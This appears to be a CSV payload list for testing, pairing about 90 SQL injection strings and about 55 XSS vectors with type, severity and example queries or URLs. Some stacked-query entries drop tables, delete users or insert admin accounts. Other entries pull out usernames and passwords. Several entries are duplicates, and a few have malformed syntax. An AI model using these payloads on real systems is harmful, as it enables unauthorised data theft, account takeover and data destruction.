id,description,payload,context,type,severity,example_query,example_usage
sqli-001,Basic tautology-based SQL injection,' OR '1'='1,Login form username input,tautology,high,SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '',
sqli-002,Union-based SQL injection to extract data,"' UNION SELECT username, password FROM users--",Search input field,union,high,"SELECT name, description FROM products WHERE name = '' UNION SELECT username, password FROM users--",
sqli-003,Blind SQL injection with time delay,'; WAITFOR DELAY '0:0:5'--,ID parameter in URL,blind-time,medium,SELECT * FROM orders WHERE id = ''; WAITFOR DELAY '0:0:5'--,
sqli-004,Error-based SQL injection to reveal database version,"' AND 1=CONVERT(int,@@version)--",User ID input,error-based,medium,"SELECT * FROM users WHERE id = '' AND 1=CONVERT(int,@@version)--",
sqli-005,Boolean-based blind SQL injection,' AND 1=1--,Search field,boolean-blind,medium,SELECT * FROM products WHERE name = '' AND 1=1--,
sqli-006,Stacked queries to execute multiple statements,'; DROP TABLE users--,User input in form,stacked-queries,critical,SELECT * FROM users WHERE username = ''; DROP TABLE users--,
sqli-007,Using comment to truncate query,' OR 1=1--,Login password field,tautology,high,SELECT * FROM users WHERE password = '' OR 1=1--,
sqli-008,Hex encoded payload,0x27 OR 0x31=0x31--,URL parameter,tautology,medium,SELECT * FROM products WHERE id = 0x27 OR 0x31=0x31--,
sqli-009,Using sleep for blind time-based injection,'; SELECT pg_sleep(5)--,PostgreSQL ID parameter,blind-time,medium,SELECT * FROM orders WHERE id = ''; SELECT pg_sleep(5)--,
sqli-010,Extracting database user with error-based injection,"' AND 1=CONVERT(int,USER())--",User input,error-based,medium,"SELECT * FROM accounts WHERE user = '' AND 1=CONVERT(int,USER())--",
sqli-011,Blind boolean-based injection with AND condition,"' AND SUBSTRING(@@version,1,1)='5'--",Search input,boolean-blind,medium,"SELECT * FROM products WHERE name = '' AND SUBSTRING(@@version,1,1)='5'--",
sqli-012,Using OR with false condition to bypass filters,' OR 'a'='a,Login username,tautology,high,SELECT * FROM users WHERE username = '' OR 'a'='a' AND password = '',
sqli-013,Using double dash comment to truncate query,' OR 1=1-- -,Search field,tautology,high,SELECT * FROM items WHERE name = '' OR 1=1-- -,
sqli-014,Using inline comment to bypass filters,'//OR//1=1--,Login form,tautology,high,SELECT * FROM users WHERE username = ''//OR//1=1--,
sqli-015,Using cast to bypass filters,' OR CAST('a' AS INT)=CAST('a' AS INT)--,User input,tautology,medium,SELECT * FROM users WHERE username = '' OR CAST('a' AS INT)=CAST('a' AS INT)--,
sqli-016,Using sleep in MySQL for time-based blind injection,' OR SLEEP(5)--,ID parameter,blind-time,medium,SELECT * FROM orders WHERE id = '' OR SLEEP(5)--,
sqli-017,Using extractvalue for error-based injection,"' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--",User input,error-based,high,"SELECT * FROM users WHERE id = '' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--",
sqli-018,Using updatexml for error-based injection,"' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--",User input,error-based,high,"SELECT * FROM users WHERE id = '' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--",
sqli-019,Using sleep in PostgreSQL for time-based injection,'; SELECT pg_sleep(10)--,ID parameter,blind-time,medium,SELECT * FROM orders WHERE id = ''; SELECT pg_sleep(10)--,
sqli-021,Using OR with sleep for time delay in MySQL,' OR SLEEP(10)--,Search input,blind-time,medium,SELECT * FROM products WHERE name = '' OR SLEEP(10)--,
sqli-022,Using UNION SELECT with NULLs to bypass column count,"' UNION SELECT NULL, NULL, username, password FROM users--",Search field,union,high,"SELECT id, name, description FROM products WHERE name = '' UNION SELECT NULL, NULL, username, password FROM users--",
sqli-023,Using OR with false condition and inline comment,' OR 1=1/*,Login username,tautology,high,SELECT * FROM users WHERE username = '' OR 1=1/*,
sqli-024,Using AND with subquery for blind boolean injection,' AND (SELECT COUNT(*) FROM users) > 0--,Search input,boolean-blind,medium,SELECT * FROM products WHERE name = '' AND (SELECT COUNT(*) FROM users) > 0--,
sqli-025,Using OR with sleep for time delay in PostgreSQL,' OR pg_sleep(7)--,ID parameter,blind-time,medium,SELECT * FROM orders WHERE id = '' OR pg_sleep(7)--,
sqli-026,Using UNION SELECT with database() function,"' UNION SELECT database(), NULL--",Search input,union,high,"SELECT name, description FROM products WHERE name = '' UNION SELECT database(), NULL--",
sqli-027,Using OR with sleep for time delay in SQL Server,'; WAITFOR DELAY '0:0:10'--,User ID input,blind-time,medium,SELECT * FROM users WHERE id = ''; WAITFOR DELAY '0:0:10'--,
sqli-028,Using OR with cast to bypass filters,' OR CAST(1 AS INT)=1--,Login form,tautology,medium,SELECT * FROM users WHERE username = '' OR CAST(1 AS INT)=1--,
sqli-029,Using OR with substring for blind boolean injection,"' OR SUBSTRING(user(),1,1)='r'--",Search input,boolean-blind,medium,"SELECT * FROM products WHERE name = '' OR SUBSTRING(user(),1,1)='r'--",
sqli-030,Using OR with sleep for time delay in Oracle,' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(5))--,User input,blind-time,medium,SELECT * FROM users WHERE username = '' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(5))--,
sqli-031,Using UNION SELECT with information_schema.tables,"' UNION SELECT table_name, NULL FROM information_schema.tables--",Search input,union,high,"SELECT name, description FROM products WHERE name = '' UNION SELECT table_name, NULL FROM information_schema.tables--",
sqli-032,Using OR with sleep for time delay in SQLite,' OR (SELECT sleep(5))--,ID parameter,blind-time,medium,SELECT * FROM orders WHERE id = '' OR (SELECT sleep(5))--,
sqli-033,Using OR with hex encoded string,' OR 0x61646d696e=0x61646d696e--,Login username,tautology,medium,SELECT * FROM users WHERE username = '' OR 0x61646d696e=0x61646d696e--,
sqli-034,Using OR with sleep for time delay in MySQL with comment,' OR SLEEP(5)#,Search input,blind-time,medium,SELECT * FROM products WHERE name = '' OR SLEEP(5)#,
sqli-035,Using UNION SELECT with user() function,"' UNION SELECT user(), NULL--",Search input,union,high,"SELECT name, description FROM products WHERE name = '' UNION SELECT user(), NULL--",
sqli-036,Using OR with sleep for time delay in PostgreSQL with comment,' OR pg_sleep(3)--,ID parameter,blind-time,medium,SELECT * FROM orders WHERE id = '' OR pg_sleep(3)--,
sqli-037,Using OR with sleep for time delay in SQL Server with comment,'; WAITFOR DELAY '0:0:3'--,User ID input,blind-time,medium,SELECT * FROM users WHERE id = ''; WAITFOR DELAY '0:0:3'--,
sqli-038,Using OR with substring for blind boolean injection with comment,"' OR SUBSTRING(@@version,1,1)='5'--",Search input,boolean-blind,medium,"SELECT * FROM products WHERE name = '' OR SUBSTRING(@@version,1,1)='5'--",
sqli-039,Using OR with sleep for time delay in Oracle with comment,' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(3))--,User input,blind-time,medium,SELECT * FROM users WHERE username = '' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(3))--,
sqli-041,Using OR with sleep for time delay in MySQL with inline comment,' OR SLEEP(8)/*,Search input,blind-time,medium,SELECT * FROM products WHERE name = '' OR SLEEP(8)/*,
sqli-042,Using UNION SELECT to extract table names,"' UNION SELECT table_name, NULL FROM information_schema.tables--",Search input,union,high,"SELECT name, description FROM products WHERE name = '' UNION SELECT table_name, NULL FROM information_schema.tables--",
sqli-043,Using OR with substring for blind boolean injection with inline comment,"' OR SUBSTRING(user(),1,1)='a'/*",Login input,boolean-blind,medium,"SELECT * FROM users WHERE username = '' OR SUBSTRING(user(),1,1)='a'/*",
sqli-044,Using stacked queries to update data,'; UPDATE users SET password='hacked' WHERE username='admin'--,User input,stacked-queries,critical,SELECT * FROM users WHERE username = ''; UPDATE users SET password='hacked' WHERE username='admin'--,
sqli-045,Using OR with sleep for time delay in PostgreSQL with inline comment,' OR pg_sleep(6)/*,ID parameter,blind-time,medium,SELECT * FROM orders WHERE id = '' OR pg_sleep(6)/*,
sqli-046,Using UNION SELECT to extract column names,"' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--",Search input,union,high,"SELECT name, description FROM products WHERE name = '' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--",
sqli-047,Using OR with cast for tautology,' OR CAST('1' AS INT)=1--,Login form,tautology,medium,SELECT * FROM users WHERE username = '' OR CAST('1' AS INT)=1--,
sqli-048,Using OR with sleep for time delay in SQL Server with inline comment,'; WAITFOR DELAY '0:0:7'/*,User ID input,blind-time,medium,SELECT * FROM users WHERE id = ''; WAITFOR DELAY '0:0:7'/*,
sqli-049,Using OR with substring for blind boolean injection with hash comment,"' OR SUBSTRING(@@version,1,1)='8'#",Search input,boolean-blind,medium,"SELECT * FROM products WHERE name = '' OR SUBSTRING(@@version,1,1)='8'#",
sqli-050,Using UNION SELECT to extract user(),"' UNION SELECT user(), NULL--",Search input,union,high,"SELECT name, description FROM products WHERE name = '' UNION SELECT user(), NULL--",
sqli-051,Using OR with sleep for time delay in Oracle with inline comment,' OR 1=(SELECT COUNT() FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(7))/,User input,blind-time,medium,SELECT * FROM users WHERE username = '' OR 1=(SELECT COUNT() FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(7))/,
sqli-052,Using stacked queries to delete data,'; DELETE FROM users WHERE username='guest'--,User input,stacked-queries,critical,SELECT * FROM users WHERE username = ''; DELETE FROM users WHERE username='guest'--,
sqli-053,Using OR with hex encoded tautology,' OR 0x31=0x31--,Login username,tautology,medium,SELECT * FROM users WHERE username = '' OR 0x31=0x31--,
sqli-054,Using OR with sleep for time delay in MySQL with hash comment,' OR SLEEP(9)#,Search input,blind-time,medium,SELECT * FROM products WHERE name = '' OR SLEEP(9)#,
sqli-055,Using UNION SELECT to extract schema names,"' UNION SELECT schema_name, NULL FROM information_schema.schemata--",Search input,union,high,"SELECT name, description FROM products WHERE name = '' UNION SELECT schema_name, NULL FROM information_schema.schemata--",
sqli-056,Using OR with sleep for time delay in PostgreSQL with hash comment,' OR pg_sleep(4)#,ID parameter,blind-time,medium,SELECT * FROM orders WHERE id = '' OR pg_sleep(4)#,
sqli-057,Using OR with cast for tautology with inline comment,' OR CAST(1 AS INT)=1/*,Login form,tautology,medium,SELECT * FROM users WHERE username = '' OR CAST(1 AS INT)=1/*,
sqli-058,Using OR with substring for blind boolean injection with inline comment,"' OR SUBSTRING(user(),1,1)='b'/*",Search input,boolean-blind,medium,"SELECT * FROM products WHERE name = '' OR SUBSTRING(user(),1,1)='b'/*",
sqli-059,Using UNION SELECT to extract current database,"' UNION SELECT database(), NULL--",Search input,union,high,"SELECT name, description FROM products WHERE name = '' UNION SELECT database(), NULL--",
sqli-060,Using stacked queries to create new user,"'; INSERT INTO users (username, password) VALUES ('newuser', 'pass123')--",User input,stacked-queries,critical,"SELECT * FROM users WHERE username = ''; INSERT INTO users (username, password) VALUES ('newuser', 'pass123')--",
sqli-061,Using OR with sleep for time delay in SQL Server with hash comment,'; WAITFOR DELAY '0:0:5'#,User ID input,blind-time,medium,SELECT * FROM users WHERE id = ''; WAITFOR DELAY '0:0:5'#,
sqli-062,Using OR with substring for blind boolean injection with hash comment,"' OR SUBSTRING(@@version,1,1)='9'#",Search input,boolean-blind,medium,"SELECT * FROM products WHERE name = '' OR SUBSTRING(@@version,1,1)='9'#",
sqli-063,Using UNION SELECT to extract user privileges,"' UNION SELECT user(), NULL--",Search input,union,high,"SELECT name, description FROM products WHERE name = '' UNION SELECT user(), NULL--",
sqli-064,Using OR with sleep for time delay in Oracle with hash comment,' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(4))#,User input,blind-time,medium,SELECT * FROM users WHERE username = '' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(4))#,
sqli-065,Using stacked queries to drop table,'; DROP TABLE sessions--,User input,stacked-queries,critical,SELECT * FROM users WHERE username = ''; DROP TABLE sessions--,
sqli-066,Using OR with hex encoded tautology with comment,' OR 0x41=0x41--,Login username,tautology,medium,SELECT * FROM users WHERE username = '' OR 0x41=0x41--,
sqli-067,Using OR with sleep for time delay in MySQL with double dash comment,' OR SLEEP(11)--,Search input,blind-time,medium,SELECT * FROM products WHERE name = '' OR SLEEP(11)--,
sqli-068,Using UNION SELECT to extract schema names with comment,"' UNION SELECT schema_name, NULL FROM information_schema.schemata--",Search input,union,high,"SELECT name, description FROM products WHERE name = '' UNION SELECT schema_name, NULL FROM information_schema.schemata--",
sqli-069,Using OR with sleep for time delay in PostgreSQL with double dash comment,' OR pg_sleep(12)--,ID parameter,blind-time,medium,SELECT * FROM orders WHERE id = '' OR pg_sleep(12)--,
sqli-071,Using OR with sleep for time delay in MySQL with double dash comment,' OR SLEEP(12)--,Search input,blind-time,medium,SELECT * FROM products WHERE name = '' OR SLEEP(12)--,
sqli-072,Using UNION SELECT to extract column names with comment,"' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='orders'--",Search input,union,high,"SELECT name, description FROM products WHERE name = '' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='orders'--",
sqli-073,Using OR with substring for blind boolean injection with double dash comment,"' OR SUBSTRING(user(),1,1)='c'--",Login input,boolean-blind,medium,"SELECT * FROM users WHERE username = '' OR SUBSTRING(user(),1,1)='c'--",
sqli-074,Using stacked queries to insert admin user,"'; INSERT INTO users (username, password, role) VALUES ('admin2', 'pass123', 'admin')--",User input,stacked-queries,critical,"SELECT * FROM users WHERE username = ''; INSERT INTO users (username, password, role) VALUES ('admin2', 'pass123', 'admin')--",
sqli-075,Using OR with sleep for time delay in PostgreSQL with double dash comment,' OR pg_sleep(8)--,ID parameter,blind-time,medium,SELECT * FROM orders WHERE id = '' OR pg_sleep(8)--,
sqli-076,Using UNION SELECT to extract database version,"' UNION SELECT @@version, NULL--",Search input,union,high,"SELECT name, description FROM products WHERE name = '' UNION SELECT @@version, NULL--",
sqli-077,Using OR with cast for tautology with double dash comment,' OR CAST('1' AS INT)=1--,Login form,tautology,medium,SELECT * FROM users WHERE username = '' OR CAST('1' AS INT)=1--,
sqli-078,Using OR with sleep for time delay in SQL Server with double dash comment,'; WAITFOR DELAY '0:0:8'--,User ID input,blind-time,medium,SELECT * FROM users WHERE id = ''; WAITFOR DELAY '0:0:8'--,
sqli-079,Using OR with substring for blind boolean injection with double dash comment,"' OR SUBSTRING(@@version,1,1)='7'--",Search input,boolean-blind,medium,"SELECT * FROM products WHERE name = '' OR SUBSTRING(@@version,1,1)='7'--",
sqli-080,Using UNION SELECT to extract current user,"' UNION SELECT user(), NULL--",Search input,union,high,"SELECT name, description FROM products WHERE name = '' UNION SELECT user(), NULL--",
sqli-081,Using OR with sleep for time delay in Oracle with double dash comment,' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(8))--,User input,blind-time,medium,SELECT * FROM users WHERE username = '' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(8))--,
sqli-082,Using stacked queries to delete admin user,'; DELETE FROM users WHERE username='admin'--,User input,stacked-queries,critical,SELECT * FROM users WHERE username = ''; DELETE FROM users WHERE username='admin'--,
sqli-083,Using OR with hex encoded tautology with double dash comment,' OR 0x42=0x42--,Login username,tautology,medium,SELECT * FROM users WHERE username = '' OR 0x42=0x42--,
sqli-084,Using OR with sleep for time delay in MySQL with double dash comment,' OR SLEEP(13)--,Search input,blind-time,medium,SELECT * FROM products WHERE name = '' OR SLEEP(13)--,
sqli-085,Using UNION SELECT to extract schema names with double dash comment,"' UNION SELECT schema_name, NULL FROM information_schema.schemata--",Search input,union,high,"SELECT name, description FROM products WHERE name = '' UNION SELECT schema_name, NULL FROM information_schema.schemata--",
sqli-086,Using OR with sleep for time delay in PostgreSQL with double dash comment,' OR pg_sleep(14)--,ID parameter,blind-time,medium,SELECT * FROM orders WHERE id = '' OR pg_sleep(14)--,
sqli-087,Using OR with cast for tautology with double dash comment,' OR CAST(1 AS INT)=1--,Login form,tautology,medium,SELECT * FROM users WHERE username = '' OR CAST(1 AS INT)=1--,
sqli-088,Using OR with substring for blind boolean injection with double dash comment,"' OR SUBSTRING(user(),1,1)='d'--",Search input,boolean-blind,medium,"SELECT * FROM products WHERE name = '' OR SUBSTRING(user(),1,1)='d'--",
sqli-089,Using UNION SELECT to extract current database with double dash comment,"' UNION SELECT database(), NULL--",Search input,union,high,"SELECT name, description FROM products WHERE name = '' UNION SELECT database(), NULL--",
sqli-090,Using stacked queries to create new admin user,"'; INSERT INTO users (username, password, role) VALUES ('superadmin', 'pass456', 'admin')--",User input,stacked-queries,critical,"SELECT * FROM users WHERE username = ''; INSERT INTO users (username, password, role) VALUES ('superadmin', 'pass456', 'admin')--",
sqli-091,Using OR with sleepfor time delay in SQL Server with double dash comment,'; WAITFOR DELAY '0:0:9'--,User ID input,blind-time,medium,SELECT * FROM users WHERE id = ''; WAITFOR DELAY '0:0:9'--,
sqli-092,Using OR with substring for blind boolean injection with double dash comment,"' OR SUBSTRING(@@version,1,1)='6'--",Search input,boolean-blind,medium,"SELECT * FROM products WHERE name = '' OR SUBSTRING(@@version,1,1)='6'--",
sqli-093,Using UNION SELECT to extract user privileges with double dash comment,"' UNION SELECT user(), NULL--",Search input,union,high,"SELECT name, description FROM products WHERE name = '' UNION SELECT user(), NULL--",
sqli-094,Using OR with sleep for time delay in Oracle with double dash comment,' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(9))--,User input,blind-time,medium,SELECT * FROM users WHERE username = '' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(9))--,
sqli-095,Using stacked queries to drop sessions table,'; DROP TABLE sessions--,User input,stacked-queries,critical,SELECT * FROM users WHERE username = ''; DROP TABLE sessions--,
sqli-096,Using OR with hex encoded tautology with double dash comment,' OR 0x43=0x43--,Login username,tautology,medium,SELECT * FROM users WHERE username = '' OR 0x43=0x43--,
sqli-097,Using OR with sleep for time delay in MySQL with double dash comment,' OR SLEEP(14)--,Search input,blind-time,medium,SELECT * FROM products WHERE name = '' OR SLEEP(14)--,
sqli-098,Using UNION SELECT to extract schema names with double dash comment,"' UNION SELECT schema_name, NULL FROM information_schema.schemata--",Search input,union,high,"SELECT name, description FROM products WHERE name = '' UNION SELECT schema_name, NULL FROM information_schema.schemata--",
sqli-099,Using OR with sleep for time delay in PostgreSQL with double dash comment,' OR pg_sleep(15)--,ID parameter,blind-time,medium,SELECT * FROM orders WHERE id = '' OR pg_sleep(15)--,
xss-001,Basic reflected XSS with script tag,<script>alert('XSS1')</script>,URL parameter,reflected,high,,http://example.com/search?q=<script>alert('XSS1')</script>
xss-002,Reflected XSS with image tag and onerror event,<img src=x onerror=alert('XSS2')>,URL parameter,reflected,high,,http://example.com/search?q=<img src=x onerror=alert('XSS2')>
xss-003,Stored XSS with script tag in comment field,<script>alert('XSS3')</script>,Comment input,stored,high,,Submitting comment: <script>alert('XSS3')</script>
xss-004,Reflected XSS with javascript: URI in anchor tag,"<a href='javascript:alert(""XSS4"")'>click</a>",URL parameter,reflected,high,,"http://example.com/page?link=<a href='javascript:alert(""XSS4"")'>click</a>"
xss-005,Reflected XSS with input tag and onfocus event,<input autofocus onfocus=alert('XSS5')>,URL parameter,reflected,high,,http://example.com/search?q=<input autofocus onfocus=alert('XSS5')>
xss-006,Stored XSS with iframe tag,"<iframe src='javascript:alert(""XSS6"")'></iframe>",User profile bio,stored,high,,"User bio: <iframe src='javascript:alert(""XSS6"")'></iframe>"
xss-007,Reflected XSS with SVG and onload event,<svg onload=alert('XSS7')>,URL parameter,reflected,high,,http://example.com/search?q=<svg onload=alert('XSS7')>
xss-008,Reflected XSS with body tag and onload event,<body onload=alert('XSS8')>,URL parameter,reflected,high,,http://example.com/page?param=<body onload=alert('XSS8')>
xss-009,Stored XSS with event handler in div tag,<div onclick=alert('XSS9')>Click me</div>,User input field,stored,high,,User input: <div onclick=alert('XSS9')>Click me</div>
xss-010,Reflected XSS with meta refresh tag,"<meta http-equiv='refresh' content='0;url=javascript:alert(""XSS10"")'>",URL parameter,reflected,high,,"http://example.com/page?param=<meta http-equiv='refresh' content='0;url=javascript:alert(""XSS10"")'>"
xss-011,Reflected XSS with style tag and expression,"<style>body{background:url(""javascript:alert('XSS11')"")}</style>",URL parameter,reflected,high,,"http://example.com/page?param=<style>body{background:url(""javascript:alert('XSS11')"")}</style>"
xss-012,Reflected XSS with script tag and encoded payload,%3Cscript%3Ealert('XSS12')%3C/script%3E,URL parameter,reflected,high,,http://example.com/search?q=%3Cscript%3Ealert('XSS12')%3C/script%3E
xss-013,Stored XSS with onmouseover event in span tag,<span onmouseover=alert('XSS13')>Hover me</span>,User input field,stored,high,,User input: <span onmouseover=alert('XSS13')>Hover me</span>
xss-014,Reflected XSS with iframe and srcdoc attribute,"<iframe srcdoc=""<script>alert('XSS14')</script>""></iframe>",URL parameter,reflected,high,,"http://example.com/page?param=<iframe srcdoc=""<script>alert('XSS14')</script>""></iframe>"
xss-015,Reflected XSS with object tag and data attribute,"<object data='javascript:alert(""XSS15"")'></object>",URL parameter,reflected,high,,"http://example.com/page?param=<object data='javascript:alert(""XSS15"")'></object>"
xss-016,Stored XSS with form tag and onsubmit event,<form onsubmit=alert('XSS16')><input type='submit'></form>,User input field,stored,high,,User input: <form onsubmit=alert('XSS16')><input type='submit'></form>
xss-017,Reflected XSS with video tag and onerror event,<video src=x onerror=alert('XSS17')></video>,URL parameter,reflected,high,,http://example.com/page?param=<video src=x onerror=alert('XSS17')></video>
xss-018,Reflected XSS with audio tag and onerror event,<audio src=x onerror=alert('XSS18')></audio>,URL parameter,reflected,high,,http://example.com/page?param=<audio src=x onerror=alert('XSS18')></audio>
xss-019,Stored XSS with textarea and onfocus event,<textarea onfocus=alert('XSS19')>Focus me</textarea>,User input field,stored,high,,User input: <textarea onfocus=alert('XSS19')>Focus me</textarea>
xss-020,Reflected XSS with math tag and href attribute,"<math href='javascript:alert(""XSS20"")'>X</math>",URL parameter,reflected,high,,"http://example.com/page?param=<math href='javascript:alert(""X20"")'>X</math>"
xss-021,Reflected XSS with base tag and href attribute,"<base href=""javascript:alert('XSS21');//"">",URL parameter,reflected,high,,"http://example.com/page?param=<base href=""javascript:alert('XSS21');//"">"
xss-022,Stored XSS with anchor tag and onclick event,"<a href='#' onclick='alert(""XSS22"")'>Click me</a>",User input field,stored,high,,"User input: <a href='#' onclick='alert(""XSS22"")'>Click me</a>"
xss-023,Reflected XSS with meta tag and content attribute,"<meta http-equiv='refresh' content='0;url=javascript:alert(""XSS23"")'>",URL parameter,reflected,high,,"http://example.com/page?param=<meta http-equiv='refresh' content='0;url=javascript:alert(""XSS23"")'>"
xss-024,Stored XSS with button tag and onclick event,"<button onclick='alert(""XSS24"")'>Click</button>",User input field,stored,high,,"User input: <button onclick='alert(""XSS24"")'>Click</button>"
xss-025,Reflected XSS with form tag and onreset event,<form onreset=alert('XSS25')><input type='reset'></form>,URL parameter,reflected,high,,http://example.com/page?param=<form onreset=alert('XSS25')><input type='reset'></form>
xss-026,Stored XSS with marquee tag and onstart event,<marquee onstart=alert('XSS26')>Scrolling text</marquee>,User input field,stored,high,,User input: <marquee onstart=alert('XSS26')>Scrolling text</marquee>
xss-027,Reflected XSS with embed tag and src attribute,"<embed src='javascript:alert(""XSS27"")'>",URL parameter,reflected,high,,"http://example.com/page?param=<embed src='javascript:alert(""XSS27"")'>"
xss-028,Stored XSS with bgsound tag and src attribute,"<bgsound src='javascript:alert(""XSS28"")'>",User input field,stored,high,,"User input: <bgsound src='javascript:alert(""XSS28"")'>"
xss-029,Reflected XSS with xml tag and onload event,<xml onload=alert('XSS29')>,URL parameter,reflected,high,,http://example.com/page?param=<xml onload=alert('XSS29')>
xss-031,Reflected XSS using SVG with animate element and begin attribute,<svg><animate attributeName='onbegin' begin='0s' dur='1s' repeatCount='1' fill='freeze' to='alert(1)'/></svg>,URL parameter,reflected,high,,http://example.com/page?param=<svg><animate attributeName='onbegin' begin='0s' dur='1s' repeatCount='1' fill='freeze' to='alert(1)'/></svg>
xss-032,Stored XSS using JavaScript URI in base tag,"<base href=""javascript:alert('XSS32');//"">",User profile input,stored,high,,"User profile: <base href=""javascript:alert('XSS32');//"">"
xss-033,Reflected XSS using malformed iframe with srcdoc and encoded script,<iframe srcdoc='%3Cscript%3Ealert(33)%3C/script%3E'></iframe>,URL parameter,reflected,high,,http://example.com/page?param=<iframe srcdoc='%3Cscript%3Ealert(33)%3C/script%3E'></iframe>
xss-034,Stored XSS using onpointerover event in div,"<div onpointerover='alert(""XSS34"")'>Hover me</div>",User input field,stored,high,,"User input: <div onpointerover='alert(""XSS34"")'>Hover me</div>"
xss-035,Reflected XSS using malformed script tag with backticks,<script>alert(XSS35)</script>,URL parameter,reflected,high,,http://example.com/page?param=<script>alert(XSS35)</script>
xss-036,Stored XSS using SVG foreignObject with embedded HTML and script,<svg><foreignObject><body><script>alert('XSS36')</script></body></foreignObject></svg>,User input field,stored,high,,User input: <svg><foreignObject><body><script>alert('XSS36')</script></body></foreignObject></svg>
xss-037,Reflected XSS using onanimationstart event in div,"<div style='animation-name:x' onanimationstart='alert(""XSS37"")'>Test</div>",URL parameter,reflected,high,,"http://example.com/page?param=<div style='animation-name:x' onanimationstart='alert(""XSS37"")'>Test</div>"
xss-038,Stored XSS using input tag with oninput event,"<input oninput='alert(""XSS38"")'>",User input field,stored,high,,"User input: <input oninput='alert(""XSS38"")'>"
xss-039,Reflected XSS using malformed script with template literals,<script>eval(alert('XSS39'))</script>,URL parameter,reflected,high,,http://example.com/page?param=<script>eval(alert('XSS39'))</script>
xss-040,Stored XSS using object tag with data URI,"<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTNDAnKTs8L3NjcmlwdD4='></object>",User input field,stored,high,,"User input: <object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTNDAnKTs8L3NjcmlwdD4='></object>"
xss-041,Reflected XSS using onpointerdown event in span,"<span onpointerdown='alert(""XSS41"")'>Click me</span>",URL parameter,reflected,high,,"http://example.com/page?param=<span onpointerdown='alert(""XSS41"")'>Click me</span>"
xss-042,Stored XSS using math tag with href attribute and javascript URI,"<math href='javascript:alert(""XSS42"")'>X</math>",User input field,stored,high,,"User input: <math href='javascript:alert(""XSS42"")'>X</math>"
xss-043,Reflected XSS using iframe with sandbox attribute bypass,"<iframe sandbox='allow-scripts' srcdoc='<script>alert(""XSS43"")</script>'></iframe>",URL parameter,reflected,high,,"http://example.com/page?param=<iframe sandbox='allow-scripts' srcdoc='<script>alert(""XSS43"")</script>'></iframe>"
xss-044,Stored XSS using video tag with oncanplay event,"<video oncanplay='alert(""XSS44"")'></video>",User input field,stored,high,,"User input: <video oncanplay='alert(""XSS44"")'></video>"
xss-045,Reflected XSS using meta tag with refresh and encoded javascript URI,"<meta http-equiv='refresh' content='0;url=javascript&#58;alert(""XSS45"")'>",URL parameter,reflected,high,,"http://example.com/page?param=<meta http-equiv='refresh' content='0;url=javascript&#58;alert(""XSS45"")'>"
xss-046,Stored XSS using svg with set attribute and onbegin event,"<svg><set attributeName='onbegin' to='alert(""XSS46"")' begin='0s' dur='1s'/></svg>",User input field,stored,high,,"User input: <svg><set attributeName='onbegin' to='alert(""XSS46"")' begin='0s' dur='1s'/></svg>"
xss-047,Reflected XSS using malformed script with setTimeout,"<script>setTimeout('alert(""XSS47"")',0)</script>",URL parameter,reflected,high,,"http://example.com/page?param=<script>setTimeout('alert(""XSS47"")',0)</script>"
xss-048,Stored XSS using details tag with ontoggle event,"<details ontoggle='alert(""XSS48"")'><summary>Click me</summary></details>",User input field,stored,high,,"User input: <details ontoggle='alert(""XSS48"")'><summary>Click me</summary</details>"
xss-049,Reflected XSS using input tag with formaction attribute,"<input formaction='javascript:alert(""XSS49"")' type='submit'>",URL parameter,reflected,high,,"http://example.com/page?param=<input formaction='javascript:alert(""XSS49"")' type='submit'>"
xss-050,Stored XSS using svg with animateMotion and onbegin event,"<svg><animateMotion onbegin='alert(""XSS50"")' dur='1s' repeatCount='1'/></svg>",User input field,stored,high,,"User input: <svg><animateMotion onbegin='alert(""XSS50"")' dur='1s' repeatCount='1'/></svg>"
xss-051,Reflected XSS using script tag with setInterval,"<script>setInterval(function(){alert('XSS51')},1000)</script>",URL parameter,reflected,high,,"http://example.com/page?param=<script>setInterval(function(){alert('XSS51')},1000)</script>"
xss-052,Stored XSS using iframe with onload and srcdoc,"<iframe srcdoc='<script>alert(""XSS52"")</script>' onload='alert(""XSS52"")'></iframe>",User input field,stored,high,,"User input: <iframe srcdoc='<script>alert(""XSS52"")</script>' onload='alert(""XSS52"")'></iframe>"
xss-053,Reflected XSS using svg with onload and script tag,"<svg onload='alert(""XSS53"")'><script>alert('XSS53')</script></svg>",URL parameter,reflected,high,,"http://example.com/page?param=<svg onload='alert(""XSS53"")'><script>alert('XSS53')</script></svg>"
xss-054,Stored XSS using iframe with src set to javascript URI,"<iframe src='javascript:alert(""XSS54"")'></iframe>",User input field,stored,high,,"User input: <iframe src='javascript:alert(""XSS54"")'></iframe>"
xss-055,Reflected XSS using object tag with type attribute and data URI,"<object type='text/html' data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTNTUnKTs8L3NjcmlwdD4='></object>",URL parameter,reflected,high,,"http://example.com/page?param=<object type='text/html' data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTNTUnKTs8L3NjcmlwdD4='></object>"
